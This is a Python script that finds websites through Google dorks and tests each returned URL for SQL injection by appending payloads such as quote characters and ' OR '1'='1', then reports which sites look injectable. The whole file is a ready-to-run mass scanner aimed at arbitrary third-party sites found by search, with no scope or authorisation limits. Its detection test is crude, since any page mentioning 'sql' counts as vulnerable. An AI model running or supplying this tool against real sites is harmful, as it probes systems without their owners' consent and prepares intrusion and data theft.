import requests
from googlesearch import search

def get_google_dorking_parameter():
    dork = input("Enter the Google dorking parameter (e.g., inurl:\"?id=\"): ")
    return dork

def get_number_of_requests():
    while True:
        try:
            num_requests = int(input("Enter the number of requests to make: "))
            return num_requests
        except ValueError:
            print("Please enter a valid number.")

def fetch_urls(dork, num_requests):
    urls = []
    try:
        for url in search(dork, num_results=num_requests):
            urls.append(url)
    except Exception as e:
        print(f"An error occurred while fetching URLs: {e}")
    return urls

def is_vulnerable_to_sqli(url):
    payloads = ["'", '"', "''", '""', "' OR '1'='1", '" OR "1"="1']
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                return True
        except requests.exceptions.RequestException as e:
            print(f"An error occurred while testing URL: {e}")
    return False

def main():
    dork = get_google_dorking_parameter()
    num_requests = get_number_of_requests()
    urls = fetch_urls(dork, num_requests)

    print(f"Testing {len(urls)} URLs for SQL injection vulnerabilities...")

    for url in urls:
        print(f"Testing URL: {url}")
        if is_vulnerable_to_sqli(url):
            print(f"Vulnerable to SQL injection: {url}")
        else:
            print(f"Not vulnerable to SQL injection: {url}")

if __name__ == "__main__":
    main()
